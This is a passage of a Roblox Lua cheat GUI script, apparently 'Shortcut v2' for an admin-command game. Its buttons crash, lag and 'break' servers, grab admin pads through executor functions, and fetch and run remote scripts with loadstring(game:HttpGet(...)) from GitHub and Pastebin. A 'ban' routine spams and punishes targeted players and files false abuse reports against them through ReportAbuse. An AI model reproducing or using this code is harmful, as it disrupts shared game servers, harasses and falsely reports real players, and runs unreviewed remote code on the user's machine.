            for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
                if L_16_forvar1.Name == "FakeCharacter" then
                    L_16_forvar1:Destroy()
                end
            end
            local L_7_ = game:GetService("Workspace").Terrain["_Game"]
            local L_8_ = L_7_.Workspace
            local L_9_ = L_7_.Admin
        end
    )

    addBtn(
        "RainbowPads",
        function(v)
            local speed = 32
            cht("gear me "..csp.."18474459");wait(1)
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket);wait(0.25)
            while true do
                for i = 0, 1, 0.001 * speed do
                    local clr = Color3.fromHSV(i, 1, 1)
                    local padss = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
                    for i, v in pairs(padss) do
                        local jkfv = v.Head
                        coroutine.wrap(function()
                                if jkfv:IsA("Part") then
                                    local v1 = {
                                        ["Part"] = jkfv,
                                        ["Color"] = clr
                                    }
                                    game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild(
                                        "Remotes"
                                    ).ServerControls:InvokeServer("PaintPart", v1)
                                end
                            end
                        )()
                    end
                    wait(1 / 12) -- recolor the map x times a second lol.
                end
            end
        end
    )

    addBtn(
        "Shutdown",
        function(v)
            cht(prefix.."shutdown")
        end
    )

    addBtn(
        "silcrash",
        function(v)
            cht(prefix.."silcrash")
        end
    )

    addBtn(
        "HideAdminPads",
        function(v)
	    cht("/movepads")
	    wait(12)
	    cht(prefix.."loopgrab")
        end
    )

    addBtn(
        "Unpunish",
        function(v)
            cht(prefix.."up")
        end
    )

    addBtn(
        "Trashserver",
        function(v)
            cht(prefix.."trashserver")
        end
    )

    addBtn(
        "*NoAdmin Lagger FE",
        function(v)
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/NoAdmin%20Lagger%20v2.3P'),true))()
        end
    )

    addBtn(
        "iy",
        function(v)
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() ;wait(13.5)
            execCmd("unkeepiy")
        end
    )

    addBtn(
        "*stop spam",
        function(v)
            game.Players:Chat(prefix.."stop")
        end
    )

    addBtn(
        "Silent commands",
        function(v)
            local invisGUIS = {}
            Players = game:GetService("Players")

            function FindInTable(tbl, val)
                if tbl == nil then
                    return false
                end
                for _, v in pairs(tbl) do
                    if v == val then
                        return true
                    end
                end
                return false
            end

            for i, v in pairs(Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
                if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
                    v.Visible = true
                    if not FindInTable(invisGUIS, v) then
                        table.insert(invisGUIS, v)
                    end
                end
            end
        end
    )

	addBtn("findregen3 (rarely works)", function()
		cht(prefix.."movedb")
		local root = plyrs.LocalPlayer.Character.HumanoidRootPart
	
		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(i * 10000, i * 10000, i * 10000))
		end
		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(-(i * 10000), -(i * 10000), -(i * 10000)))
		end


		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(-(i * 10000), i * 10000, i * 10000))
		end
		for i=0,100 do wait()
			root.CFrame = CFrame.new(Vector3.new(i * 10000, -(i * 10000), -(i * 10000)))
		end
	end)

    addBtn(
        "BreakServer",
        function(v)
            cht(prefix.."breakbp");wait()
            say(".gg/65yHbG4Wfa");wait(10)
            cht("unflash");wait(.1)
            cht(prefix.."crazycolors");wait()
            for i = 1, 4 do
                cht("h \n\n\nShortcut v2: Lol the server is now broken \n\n\n");wait(5)
            end
        end
    )

    addBtn(
        "House",
        function(v)
            cht("/house ")
        end
    )

    addBtn(
        "Logs",
        function(v)
            cht("logs viewing be like xd")
        end
    )

    addBtn(
        "*Commands",
        function(v)
            cht(prefix.."cmds")
        end
    )

    --[[addBtn(
        "*Privacy Policy",
        function(v)
            createKohlsUi(
                {
                    "Every existing execution log will be deleted",
                    "every 2 months.",
                    "We don't log IPs however",
                    "anything we may receive related ",
                    "to IPs would be hashed.",
                    "",
                    "If you have any questions please",
                    "Contact staff"
                }
            )
        end
    )]]

    addBtn(
        "*Privacy Policy",
        function(v)
            createKohlsUi(
                {
                    "Execution logs got removed for now as",
                    "v2 is out of support anyway"
                }
            )
        end
    )

    addBtn(
        "*Buy v3",
        function(v)
            createKohlsUi(
                {
                    "v3 comes with many improvements",
                    "and way more power (blacklist bypassing, insta-kick heh 😉)"
                }
            )
        end
)

    addBtn(
        "Meta commands",
        function(v)
            createKohlsUi(
                {
                    "/padban \n //skick \n //lockapi (blacklist like cmd) \n //shutdown \n //disconnect \n //v2disconnect \n //silv2dc \n //sban (kinda obsolete after update, \n used to be premium only\n but can be bypassed now) \n\n\n API Commands: \n _bn (plr) Blacklist (obsolete as well)",
                    ""
                }
            )
        end
)
--charcheck

--charcheck
    addBtn(
        "antiVampireCrash",
        function(v)
            cht("/toggle anticrashvg")
        end
    )

    addBtn(
        "EnableEmojis",
        function(v)
            cht(prefix.."emoji")
        end
    )

    addBtn(
        "Mymusiconly",
        function(v)
            cht("/toggle mymusiconly")
        end
    )

    addBtn(
        "Fixpaint",
        function(v)
            cht("/color all original")
        end
    )

    addBtn(
        "FixBaseplate",
        function(v)
            cht(prefix.."fixbp");wait(6.5)
            logn("It's ever so slightly off but I can't change that...")
        end
    )

    addBtn(
        "FixPads",
        function(v)
            cht(prefix.."fixpads");wait(6.5)
            logn("It only somewhat fixes vertical pads \n Use the Builds for a regular pad fixer")
        end
    )

    addBtn(
        "UnTabcheck",
        function(v)
            autoafk = false
            logn("It's on by default lol")
        end
    )

    addBtn(
        "Toregen",
        function(v)
            cht(prefix.."findresetpad")
        end
    )

    addBtn(
        "loadpads",
        function(v)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 6500, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z))
        end
    )

    addBtn(
        "Fixcamera",
        function(v)
            cht(prefix.."fixcam")
        end
    )

    addBtn(
        "padsenforcements",
        function(v)
            padAbuse = false
            temploopgrab = false ;wait(.35)
            cht("/toggle padsenforcements")
            logn("People can or cannot get more than 2 pads now depending on if you enabled it or disabled it")
        end
    )

    addTlg(
        "AntiAttach",
        function(v)
            antiattach = true
            cht("/toggle antiattach")
            cht("h \n\n\nServer Message: Attaching to objects using the Sit & Stun Glitch has been Disabled in this server.\n\n\n")
        end,
        function()
            antiattach = false
            cht("/toggle antiattach")
            cht("h \n\n\nThe map: You guys may now use the attach glitch to touch and mess me up now. Remember I have a pipi so be careful\n\n\n")
        end
    )

    addTlg(
        "AntiGears",
        function(v)
            cht("ungear aIl                                                                             others");wait()
            cht("//antigearon")
            antiFun = true
        end,
        function()
            antiFun = false
            antigear = false
        end
    )

    addTlg(
        "AntiLag",
        function(v)
            antiParticles = true
            antiRageTable = true
            fpsboost = true
            execCmd("boostfps")
            execCmd("clrchar")
        end,
        function()
            antiParticles = false
            antiRageTable = false
            fpsboost = false
        end
    )

    --[[addTlg(
        "AntiDog",
        function(v)
            antiDog = true
        end,
        function()
            antiDog = false
        end
    )]]

    addTlg(
        "AntiSpeed",
        function(v)
            antiSpeed = true
        end,
        function()
            antiSpeed = false
        end
    )

    addTlg(
        "ServerHop",
        function(v)
            local x = {}
            for _, v in ipairs(
                game:GetService("HttpService"):JSONDecode(
                    game:HttpGetAsync(
                        "https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100"
                    )
                ).data
            ) do
                if type(v) == "table" and v.maxPlayers > v.playing then
                    x[#x + 1] = v.id
                    amount = v.playing
                end
            end
            if #x > 0 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, x[math.random(1, #x)]) ;wait(3.5)
                cht("/srj");wait(1)
                cht("/super /srj")
            end
        end
    )

    addBtn(
        "RegenPads",
        function(v)
            fireclickdetector(adminFlr.Regen.ClickDetector, 0)
        end
    )

    addBtn(
        "Swords",
        function(v)
            cht(":pm me Tools will be given shortly.")
            cht("gear me 000000000000000000000159229806")
            cht("gear me 0000000000000000233520257")
            cht("gear me 0000000000000000000000120307951")
            cht("gear me 000000000000000000080661504")
            cht("gear me 0000000000000000000000093136802")
            cht("gear me 0000000000000000000099119240")
            cht("gear me 00000000000000000000000073829193")
            cht("gear me 000000000000000000000139577901")
            cht("gear me 0000000000000000000000002544549379");wait(3)
            logn("Type //ivory for the Ivory Periastron")
        end
    )
    addBtn(
        "Guns",
        function(v)
            cht(":pm me Tools will be given shortly.")
            cht("gear me "..csp.."00000000000116693764");wait(.35)
            cht("gear me "..csp.."0000000000212296936");wait(.35)
            cht("gear me "..csp.."000000065082275")
            cht("gear me "..csp.."000000090718350");wait(.35)
            cht("gear me "..csp.."018268645")
            cht("gear me "..csp.."0139578207")
            cht("gear me "..csp.."0139578207");wait(.35)
            cht("gear me "..csp.."097885508")
        end
    )
	addBtn(
        "AllPads",
        function(v)
		local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
		for i, pad in pairs(pads) do
			coroutine.wrap(
                    function()
				pcall(function()
					local cre = pad.Head
					local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
					firetouchinterest(cre, spr, 1)
					wait()
					firetouchinterest(cre, spr, 0);
					wait(1)
					cht("/allpadspiss")
				end)
			end)()
		end
	end
    )
	addTlg(
        "*Perm",
        function()
		perm = true
	end,
        function()
		perm = false
	end
    )
	addBtn(
        "*NoObbyKill (NOK)",
        function(v)
		local objs = gameFlr.Workspace.Obby:GetChildren()
		for i, obj in pairs(objs) do
			coroutine.wrap(function()
				pcall(function()
					obj.TouchInterest:Destroy()
				end)
			end)()
		end
	end
    )
	addBtn(
        "*Executor Specs",
        function(v)
		logn("Open the console (F9)")
		loadstring(game:HttpGet(('https://pastebin.com/raw/GVmUTeAf'), true))()
	end
    )
	addBtn(
        "no touch interests Perm",
        function(v)
		logn("It's really slow")
		cht("/permpiss") -- Added the word piss so FE chatlogs can't pick it up (It will tag out instead)
	end
    )
	local CLEFDV = false
    addTlg(
        "antiPunish | RISK",
        function()
		CLEFDV = true
		coroutine.wrap(function()
				while CLEFDV do
					task.wait(.0095)
					if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
						cht("unpunish me")
						cht(prefix.."up")
						cht("//up");wait(0.22)
                        cht("/trap others")
					end
                end
		end)()
	end,
        function()
		CLEFDV = false
	end
    )
	local ELFRGD = false
	addTlg(
        "AntiKill",
        function()
            cht("kill me")
	            ELFRGD = true
                    coroutine.wrap(function()
                            while ELFRGD and scriptActive do
                                wait(0.50)
                                if game.Players.LocalPlayer.Character.Humanoid.Health < 2 then
                                    cht("reset me " .. math.random(1, 1000))
                                    cht("god "..csp.."000000000 me " .. math.random(1, 1000))
                                end
                            end
                    end)()
	            end,
        function()
		ELFRGD = false
	end
    )
	local OELRDC = false
	addTlg(
        "AutoHeal",
        function()
		OELRDC = true
		coroutine.wrap(function()
			pcall(function()
				while OELRDC and scriptActive do
					wait(0.50)
					local hlth = game.Players.LocalPlayer.Character.Humanoid.Health
					if hlth ~= 0 and hlth ~= 100 then
						cht("heal me 99" .. math.random(1, 99))
					end
				end
			end)
		end)()
	end,
        function()
		OELRDC = false
	end
    )

	addTlg(
        "AntiBlind",
        function()
		antiBlind = true
	end,
        function()
		antiBlind = false
	end
    )

    addTlg(
        "AntiSetgrav",
        function()
            antiSetgrav = true
        end,
        function()
            antiSetgrav = false
            cht("unchar me,me,me")
        end
    )

    addBtn(
        "AntiTeleport",
        function()
            logn("It goes away when you reset. Use //oldantitp for the old one which doesn't")


            -- configuration
            local distance = 1

            -- services
            local ws = game:GetService("Workspace")
            local plyrs = game:GetService("Players")

            -- tables
            -- configuration
            local distance = 1

            -- services
            local ws = game:GetService("Workspace")
            local plyrs = game:GetService("Players")

            -- tables
            local connections = {}

            -- variables
            local lp = plyrs.LocalPlayer
            local chra = lp.Character
            local pr = chra.HumanoidRootPart
            local cam = ws.CurrentCamera

            local lastPos = nil

            -- functions
            local function floor(vec)
                return Vector3.new(math.floor(vec.X), math.floor(vec.Y), math.floor(vec.Z))
            end

            local function concatVec(vec)
                return table.concat({vec.X, vec.Y, vec.Z}, ", ")
            end

            -- code
            local connection1 =
                cam:GetPropertyChangedSignal("CFrame"):Connect(
                function()
                    local cur = pr.CFrame
                    if lastPos == nil then
                        lastPos = pr.CFrame
                        return
                    end
                    local magnitude = (floor(lastPos.p) - floor(cur.p)).Magnitude
                    if magnitude >= distance + 1 then
                        pr.CFrame = lastPos

                        print("Teleported back! (Magnitude: " .. magnitude .. ")")
                        print("(" .. concatVec(floor(lastPos.p)) .. "), (" .. concatVec(floor(cur.p)) .. ")")
                        return
                    end

                    lastPos = pr.CFrame
                end)
            table.insert(connections, connection1)

            print("Loaded! AntiTP made by yeemi<3#9764")

            repeat
                wait()
            until chra == nil
            print("Ejecting... AntiTP made by yeemi<3#9764")

            for i, v in pairs(connections) do
                v:Disconnect()
            end
            return
        end
    )
    local size =
        UIGridLayout.AbsoluteContentSize -- Set GUI Virutal size
    ScrollingFrame.CanvasSize = UDim2.new(0, size.X, 0, size.Y)
end
coroutine.wrap(NKEI_fake_script)()
local function QIQVS_fake_script() -- CloseUI.LocalScript UNUSED IN FINAL VERSION
    local script = Instance.new("LocalScript", CloseUI)

    script.Parent.MouseButton1Click:Connect(function()
            scriptActive = false
            script.Parent.Parent.Parent:Destroy()
            game:GetService("StarterGui"):SetCoreGuiEnabled("PlayerList", true)
            PlayerList:Destroy()
        end)
end
coroutine.wrap(QIQVS_fake_script)()
local function VGXONZ_fake_script() -- Frame.MguiD
    local script = Instance.new("LocalScript", Frame)

    local UserInputService = game:GetService("UserInputService")

    local gui = script.Parent

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position =
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position

                input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
            end
        end)

    gui.InputChanged:Connect(function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                dragInput = input
            end
        end)

    UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
end
coroutine.wrap(VGXONZ_fake_script)()
local function EAZWOTE_fake_script() -- SCv2_ButtonList.MguiD
    local script = Instance.new("LocalScript", SCv2_ButtonList)

    local UserInputService = game:GetService("UserInputService")

    local gui = script.Parent

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position =
            UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position

                input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
            end
        end)

    gui.InputChanged:Connect(function(input)
            if
                input.UserInputType == Enum.UserInputType.MouseMovement or
                    input.UserInputType == Enum.UserInputType.Touch
             then
                dragInput = input
            end
        end)

    UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
end
coroutine.wrap(EAZWOTE_fake_script)()

-- HERE'S THE SBAN STUFF

pcall(function()
    -- Table 1
    if game.Workspace:FindFirstChild(banned) then
        cht("pm me Banned user joined \n Ignore the spam \n They can appeal their ban in the server")
        cht("setgrav " .. banned .. " -9e9")
        cht("skydive " .. banned .. " " .. math.random(1, 1000))
        wait(.1)
        cht("setgrav " .. banned .. " -9e9")
        cht("skydive " .. banned .. " " .. math.random(1, 1000))
        cht("//temploopgrab")
        cht("punish " .. banned .. " " .. math.random(1, 1000))
        cht("noclip " .. banned .. " " .. math.random(1, 1000))
        cht("-unadmin " .. banned .. "")
        cht("-nounadmin " .. banned .. "")
        cht("/unadmin " .. banned .. "") -- Back when Takeover existed I had to do this.
        wait(.65)
        cht("punish " .. banned .. " " .. math.random(1, 1000))
        cht("invis " .. banned .. " " .. math.random(1, 1000))
        cht("pm " .. banned .. " Banned by SC v 2")
        wait(.35)
        cht("punish " .. banned .. " " .. math.random(1, 1000))
        wait(.65)
        cht("invis " .. banned .. " " .. math.random(1, 1000))
        cht("/lagall " .. math.random(1, 1000))
        wait(3.35)
        cht("punish " .. banned .. " " .. math.random(1, 1000))
        wait(3.5)
        cht("punish " .. banned .. " " .. math.random(1, 1000))
        cht("/stop " .. math.random(1, 1000))
        wait(.5)
        cht("/stop " .. math.random(1, 1000))
        cht("setgrav others 9e9")
        cht("invis " .. banned .. " " .. math.random(1, 1000))
        cht("//untemploopgrab")
        wait()
        cht("unpunish me " .. math.random(1, 1000))
        cht("/super h fardaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadnakdhadnahudnakdhankdandnkakjidnkandjiandkajidaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak aaaaaaaaaaaaaaaa" ..math.random(1, 1000))
        wait(.65)
        cht("punish " .. banned .. " " .. math.random(1, 1000))
        cht("speed others inf")
        cht("speed others inf")
        wait(.65)
        cht("setgrav others nan")
        cht("freeze m " .. math.random(1, 1000))
        wait(.35)
        cht("thaw me " .. math.random(1, 1000))
        cht("/super h fardaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadnakdhadnahudnakdhankdandnkakjidnkandjiandkajidaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak aaaaaaaaaaaaaaaa" ..math.random(1, 1000))
        wait(1.5)
        cht("//super h fardaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadnakdhadnahudnakdhankdandnkakjidnkandjiandkajidaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak aaaaaaaaaaaaaaaa" ..math.random(1, 1000))
        wait(1.25)
        cht("punish " .. banned .. " " .. math.random(1, 1000))
        cht(
            "pm " ..
                banned ..
                    " Shortcut on top \n \n \n \n \n \n  Banned by SC v 2. \n If this happens really often to you, you may've been added to our ban table. \n You can appeal your ban at our discordant server"
        )
        wait(1)
        cht("punish  " .. banned .. " " .. math.random(1, 1000))
        --cht("removelimbs me")
        --cht("size me .7")
        regen()
        wait(.35)
        --cht("/moveresetpadpiss "..math.random(1,1000))
        wait(4.45)
        cht("nograv others " .. math.random(1, 1000))
        wait(5.45)
        cht("nograv others " .. math.random(1, 1000))
        pcall(
            function()
                if syn then
                    print(banned)
                    wait(4.45)
                    cht("nograv others " .. math.random(1, 1000))
                else
                    game.Players:ReportAbuse(
                        game:GetService("Players"),
                        banned,
                        "Bullying",
                        "Said rude things about my gay friend " .. math.random(1, 1000)
                    )
                    print(banned)
                    print("Flooding the banned user with our report bot")
                    wait(4.45)
                    cht("nograv others " .. math.random(1, 1000))
                end
            -- Table 2
            if game.Workspace:FindFirstChild(bana) then
                cht("setgrav " .. bana .. " -9e9")
                cht("skydive " .. bana .. " " .. math.random(1, 1000))
                wait()
                cht(":refresh " .. bana)
                wait(.1)
                cht(":kill " .. bana)
                cht(":trip " .. bana)
                cht(":setgrav " .. bana .. " -1"..csp)
                wait(.1)
                cht(":unpunish " .. bana)
                wait(.2)
                cht(":reset " .. bana)
                wait(.65)
                cht(":punish " .. bana .. " " .. math.random(1, 10009))
                wait()
                cht("noclip " .. math.random(1, 1000))
                cht("punish " .. bana .. " " .. math.random(1, 10009))
                cht("setgrav " .. bana .. " 9e9")
                cht("unpunish " .. bana .. " " .. math.random(1, 10009))
                cht("noclip " .. bana .. " " .. math.random(1, 10009))
                cht("punish " .. bana .. " " .. math.random(1, 10009))
                regen()
            end

        end)
    end
end)

-- End of funi code
